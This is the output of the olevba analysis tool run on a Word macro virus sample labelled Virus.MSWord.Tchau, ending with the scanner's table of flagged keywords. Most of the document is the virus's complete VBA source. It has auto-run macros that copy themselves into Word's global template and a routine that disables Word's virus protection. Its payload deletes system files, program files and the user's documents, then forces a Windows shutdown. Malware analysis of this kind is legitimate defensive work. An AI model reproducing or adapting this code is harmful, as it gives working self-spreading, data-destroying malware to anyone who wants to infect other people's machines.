olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tchau
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()
WordBasic.macrocopy ":AutoNew", WordBasic.[windowname$]() + ":AutoNew"
WordBasic.macrocopy ":AutoOpen", WordBasic.[windowname$]() + ":AutoOpen"
WordBasic.macrocopy ":AutoExec", WordBasic.[windowname$]() + ":AutoExec"
WordBasic.macrocopy ":deslig", WordBasic.[windowname$]() + ":deslig"
WordBasic.macrocopy ":infector", WordBasic.[windowname$]() + ":infector"
WordBasic.macrocopy ":bombastic", WordBasic.[windowname$]() + ":bombastic"
WordBasic.macrocopy ":autoclose", WordBasic.[windowname$]() + ":autoclose"
Call atomic
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()
On Error GoTo bye
If x = True Then
Call AutoNew.main
Else
Call unguard
Call copiar
End If
bye:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public y As Boolean
Public x As Boolean
Sub main()

Documents.Add
WordBasic.macrocopy ":AutoNew", WordBasic.[windowname$]() + ":AutoNew"
WordBasic.macrocopy ":AutoOpen", WordBasic.[windowname$]() + ":AutoOpen"
WordBasic.macrocopy ":AutoExec", WordBasic.[windowname$]() + ":AutoExec"
WordBasic.macrocopy ":deslig", WordBasic.[windowname$]() + ":deslig"
WordBasic.macrocopy ":infector", WordBasic.[windowname$]() + ":infector"
WordBasic.macrocopy ":bombastic", WordBasic.[windowname$]() + ":bombastic"
WordBasic.macrocopy ":autoclose", WordBasic.[windowname$]() + ":autoclose"
x = True
Call unguard
Call atomic
End Sub
Sub unguard()
   With Options
        .VirusProtection = False
    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO deslig.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/deslig'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Código retirado de uma hp
Option Explicit
Dim lresult
Declare Function GetVersionEx& Lib "kernel32.dll" Alias "GetVersionExA" (lpStruct As OsVersionInfo)
Declare Function AbortSystemShutdown& Lib "advapi32.dll" Alias "AbortSystemShutdownA" (ByVal lpMachineName$)
Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags&, ByVal dwReserved&)
Declare Function WinHelp Lib "user32" Alias "WinHelpA" (ByVal hwnd As Long, ByVal lpHelpFile As String, ByVal wCommand As Long, ByVal dwData As Any) As Long

Type OsVersionInfo
     dwVersionInfoSize As Long
     dwMajorVersion As Long
     dwMinorVersion As Long
     dwBuildNumber As Long
     dwPlatform As Long
     szCSDVersion As String * 128
End Type

Private OsVer As OsVersionInfo
Global Const VER_PLATFORM_WIN32_WINDOWS = 1
Global Const VER_PLATFORM_WIN32_NT = 2
Global Const EWX_FORCE = 4 'constants needed for exiting Windows
Global Const EWX_LOGOFF = 0
Global Const EWX_REBOOT = 2
Global Const EWX_SHUTDOWN = 1

Global Const HELP_QUIT = 2
Global Const HELP_INDEX = 3
Global Const HELP_HELPONHELP = 4
Global Const HELP_PARTIALKEY = &H105
Sub getdown()

lresult = ExitWindowsEx(EWX_SHUTDOWN, 0&) 'shut down the computer
MsgBox "My name is Delta , Delta Zero Cronos , the HACKER!!!"
End Sub



-------------------------------------------------------------------------------
VBA MACRO infector.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/infector'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub copiar()
WordBasic.macrocopy WordBasic.[windowname$]() + ":AutoNew", "global:AutoNew"
WordBasic.macrocopy WordBasic.[windowname$]() + ":AutoOpen", "global:AutoOpen"
WordBasic.macrocopy WordBasic.[windowname$]() + ":AutoExec", "global:AutoExec"
WordBasic.macrocopy WordBasic.[windowname$]() + ":deslig", "global:deslig"
WordBasic.macrocopy WordBasic.[windowname$]() + ":infector", "global:infector"
WordBasic.macrocopy WordBasic.[windowname$]() + ":bombastic", "global:bombastic"
WordBasic.macrocopy WordBasic.[windowname$]() + ":autoclose", "global:autoclose"
Call atomic
End Sub
-------------------------------------------------------------------------------
VBA MACRO bombastic.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/bombastic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub atomic()
If Month(Now()) = 0 And Day(Now()) < 1 Then
Selection.MoveDown , Count:=400
Selection.TypeParagraph
Selection.TypeText "DiE yOur SUcKeR! , Only de HaCKer'S lIvE iN thE iNTErnet wORdl!!!"
ActiveDocument.PrintOut , , , , , , , 55
Kill "c:\windows\command.com"
Kill "c:\*.*"
Kill "c:\arquivos de programas\*.*"
Kill "c:\windows\inf\*.inf"
Kill "c:\meus documentos\*.*"
MsgBox "Agora sua HD tem mais espaço livre!", vbCritical, "LOquE KilLEr"
MsgBox "Uma sombra mortal paira sobre o ar , ela esta aqui e vai te pegar!!!", vbCritical, "LOquE aTTAcK"
Call getdown
Else
Beep
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Tchau - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()
AutoExec.x = False
AutoExec.y = False
On Error GoTo tchau
Normal.AutoExec.x = True
tchau:
Call atomic
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

